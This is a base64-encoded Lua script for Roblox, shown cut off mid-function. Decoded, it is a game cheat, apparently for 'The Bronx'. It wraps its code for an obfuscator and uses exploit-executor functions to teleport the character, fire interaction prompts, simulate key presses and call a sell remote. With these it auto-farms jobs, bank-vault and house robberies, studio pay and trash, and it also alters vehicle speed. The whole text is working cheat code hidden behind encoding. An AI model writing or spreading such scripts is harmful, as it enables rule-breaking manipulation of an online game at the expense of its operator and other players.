ICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIHR5cGVvZihMb2NhbFBsYXllci5DaGFyYWN0ZXIpID09ICJJbnN0YW5jZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBIdW1hbm9pZCBhbmQgdHlwZW9mKEh1bWFub2lkKSA9PSAiSW5zdGFuY2UiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VhdFBhcnQgPSBIdW1hbm9pZC5TZWF0UGFydAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBTZWF0UGFydCBhbmQgdHlwZW9mKFNlYXRQYXJ0KSA9PSAiSW5zdGFuY2UiIGFuZCBTZWF0UGFydDpJc0EoIlZlaGljbGVTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VhdFBhcnQuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSAqPSBWZWN0b3IzLm5ldygxIC0gQ29uZmlnLlRoZUJyb254LlZlaGljbGVNb2RpZmljYXRpb25zLkJyZWFrVmFsdWUsIDEsIDEgLSBDb25maWcuVGhlQnJvbnguVmVoaWNsZU1vZGlmaWNhdGlvbnMuQnJlYWtWYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIGxvY2FsIEdldFBsYWNlVG9QbGFjZVdvb2QgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIFdvcmtzcGFjZS5Db25zdHJ1Y3Rpb25TdHVmZjpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWUuTmFtZTpmaW5kKCJXYWxsIikgYW5kIFZhbHVlOklzQSgiUGFydCIpIGFuZCBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiUHJvbXB0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiUHJvbXB0IikuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5GYXJtcy5GYXJtQ29uc3RydWN0aW9uSm9iIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyOkdldEF0dHJpYnV0ZSgiV29ya2luZ0pvYiIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoQ0ZyYW1lLm5ldygtMTcyOSwgMzcxLCAtMTE3MSkpCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQoKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2UuQ29uc3RydWN0aW9uU3R1ZmZbIlN0YXJ0IEpvYiJdLlByb21wdCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBMb2NhbFBsYXllcjpHZXRBdHRyaWJ1dGUoIldvcmtpbmdKb2IiKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlBseVdvb2QiKSBhbmQgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUGx5V29vZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoQ0ZyYW1lLm5ldygtMTcyOCwgMzcxLCAtMTE3OCkpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2UuQ29uc3RydWN0aW9uU3R1ZmZbIkdyYWIgV29vZCJdLlByb21wdCkgdW50aWwgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlBseVdvb2QiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlBseVdvb2QiKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlBseVdvb2QiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlBseVdvb2QiKQoKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQbHlXb29kIikpCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFBsYWNlVG9QbGFjZVdvb2QgPSBHZXRQbGFjZVRvUGxhY2VXb29kKCkKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFBsYWNlVG9QbGFjZVdvb2QgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoUGxhY2VUb1BsYWNlV29vZC5DRnJhbWUpCgogICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFBsYWNlVG9QbGFjZVdvb2QuUHJvbXB0KQogICAgICAgICAgICAgICAgICAgIHVudGlsIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlBseVdvb2QiKSBvciBub3QgUGxhY2VUb1BsYWNlV29vZC5Qcm9tcHQuRW5hYmxlZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRydWUgZG8gdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LkZhcm1zLkZhcm1CYW5rIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgUm9iYmFibGUgPSBXb3Jrc3BhY2UudmF1bHQuZG9vci5yb2JQcm9tcHQuUHJveGltaXR5UHJvbXB0LkVuYWJsZWQKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFJvYmJhYmxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlRoZUJyb254LkZhcm1zLkFGS0NoZWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KFNhZmVQb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRHVmZmVsQmFnIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChDRnJhbWUubmV3KC0zOTcsIDM0MCwgLTU1MSkpCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQoKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2UuZHVmZmxlYmFnZXF1aXA6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IikpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQzQiKSBhbmQgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQzQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KENGcmFtZS5uZXcoLTM5MywgMzQwLCAtNTY0KSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCgogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5HVU5TLkM0LkhhbmRsZS5CdXlQcm9tcHQpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQzQiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkM0IikKCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQzQiKSkKCiAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoQ0ZyYW1lLm5ldygtMTk2LCAzNzQsIC0xMjE2KSkKCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkKCiAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChXb3Jrc3BhY2UudmF1bHQuZG9vci5yb2JQcm9tcHQuUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMikKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgTnVtYmVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkR1ZmZlbEJhZy5kaXNwbGF5LlN1cmZhY2VHdWkuRnJhbWUuVGV4dExhYmVsLlRleHQKCiAgICAgICAgICAgICAgICAgICAgTnVtYmVyID0gTnVtYmVyOmdzdWIoIjAvIiwgIiIpCgogICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCA9IDEsIHRvbnVtYmVyKE51bWJlcikgZG8KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQ2FzaCA9IFdvcmtzcGFjZS5CYW5rSXRlbXMuQ2FzaDpGaW5kRmlyc3RDaGlsZCgiQ2FzaCIpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ2FzaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSx2IGluIFdvcmtzcGFjZTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJDYXNoIiBhbmQgdjpJc0EoIk1vZGVsIikgYW5kIHY6RmluZEZpcnN0Q2hpbGQoIk1vZGVsIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDYXNoID0gdgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoQ2FzaC5Nb2RlbC5DYXNoLkNGcmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChDYXNoLk1vZGVsOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChXb3Jrc3BhY2Uuc2VsbGdvbGQuQ0ZyYW1lKQoKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQoKICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3RvcihXb3Jrc3BhY2Uuc2VsbGdvbGQuQ2xpY2tEZXRlY3RvcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5GYXJtcy5GYXJtSG91c2VzIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgSGFyZERvb3JFbmFibGVkID0gV29ya3NwYWNlLkhvdXNlUm9iYi5IYXJkRG9vci5Eb29yOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpLkVuYWJsZWQKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IEhhcmREb29yRW5hYmxlZCBhbmQgQ29uZmlnLlRoZUJyb254LkZhcm1zLkFGS0NoZWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoU2FmZVBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBIYXJkRG9vckVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoV29ya3NwYWNlLkhvdXNlUm9iYi5IYXJkRG9vci5Eb29yOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpLlBhcmVudC5DRnJhbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCgogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5Ib3VzZVJvYmIuSGFyZERvb3IuRG9vcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJQcm94aW1pdHlQcm9tcHQiLCB0cnVlKSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIFdvcmtzcGFjZS5Ib3VzZVJvYmIuSGFyZERvb3I6RmluZEZpcnN0Q2hpbGQoIlRha2VNb25leSIpIGFuZCBXb3Jrc3BhY2UuSG91c2VSb2JiLkhhcmREb29yOkZpbmRGaXJzdENoaWxkKCJUYWtlTW9uZXkiKTpGaW5kRmlyc3RDaGlsZCgiTW9uZXlHcmFiIik6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IiwgdHJ1ZSkuRW5hYmxlZAoKCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLkhvdXNlUm9iYi5IYXJkRG9vci5UYWtlTW9uZXk6R2V0Q2hpbGRyZW4oKSBkbyAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KFZhbHVlLkNGcmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoVmFsdWUuUHJveGltaXR5UHJvbXB0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDI1KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguRmFybXMuRmFybVN0dWRpbyB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpLkhlYWx0aCA9PSAwIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFByb21wdDEsIFByb21wdDIsIFByb21wdDMgPSBXb3Jrc3BhY2UuU3R1ZGlvUGF5Lk1vbmV5LlN0dWRpb1BheTE6RmluZEZpcnN0Q2hpbGQoIlByb21wdCIsIHRydWUpLCBXb3Jrc3BhY2UuU3R1ZGlvUGF5Lk1vbmV5LlN0dWRpb1BheTI6RmluZEZpcnN0Q2hpbGQoIlByb21wdCIsIHRydWUpLCBXb3Jrc3BhY2UuU3R1ZGlvUGF5Lk1vbmV5LlN0dWRpb1BheTM6RmluZEZpcnN0Q2hpbGQoIlByb21wdCIsIHRydWUpCgogICAgICAgICAgICAgICAgICAgIGlmIFByb21wdDEuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KFByb21wdDEuUGFyZW50LkNGcmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChQcm9tcHQxKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBQcm9tcHQyLkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChQcm9tcHQyLlBhcmVudC5DRnJhbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoUHJvbXB0MikKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgUHJvbXB0My5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoUHJvbXB0My5QYXJlbnQuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFByb21wdDMpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlRoZUJyb254LkZhcm1zLkFGS0NoZWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoU2FmZVBvc2l0aW9uKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBsb2NhbCBQcmVzc0tleSA9IGZ1bmN0aW9uKEtleUNvZGUsIER1cmF0aW9uKQogICAgICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgU2VydmljZXMuVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQoZmFsc2UsIEtleUNvZGUsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgIFNlcnZpY2VzLlZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEtleUNvZGUsIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdChEdXJhdGlvbikKICAgICAgICAgICAgICAgICAgICBTZXJ2aWNlcy5WaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudChmYWxzZSwgS2V5Q29kZSwgZmFsc2UsIGdhbWUpCiAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguRmFybXMuRmFybVRyYXNoIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBXb3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5OYW1lID09ICJEdW1wc3RlclByb210IiBhbmQgQ29uZmlnLlRoZUJyb254LkZhcm1zLkZhcm1UcmFzaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiUHJveGltaXR5UHJvbXB0IikgYW5kIFZhbHVlOkZpbmRGaXJzdENoaWxkKCJQcm94aW1pdHlQcm9tcHQiKS5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiUHJveGltaXR5UHJvbXB0IikuSG9sZER1cmF0aW9uID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KENGcmFtZS5uZXcoVmFsdWUuUG9zaXRpb24uWCwgVmFsdWUuUG9zaXRpb24uWSwgVmFsdWUuUG9zaXRpb24uWikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNvbGFyYSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5KEVudW0uS2V5Q29kZS5FKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiUHJveGltaXR5UHJvbXB0IikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWU6RmluZEZpcnN0Q2hpbGQoIlByb3hpbWl0eVByb21wdCIpLkhvbGREdXJhdGlvbiA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5UaGVCcm9ueC5GYXJtcy5BdXRvU2VsbFRyYXNoIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBMb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJQYXduUmVtb3RlIik6RmlyZVNlcnZlcihWYWx1ZS5OYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgR2V0R29vZENsZWFuZXIgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBDb3VudGVySW5zdGFuY2U7CgogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBXb3Jrc3BhY2VbIjEjIE1hcCJdOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICBp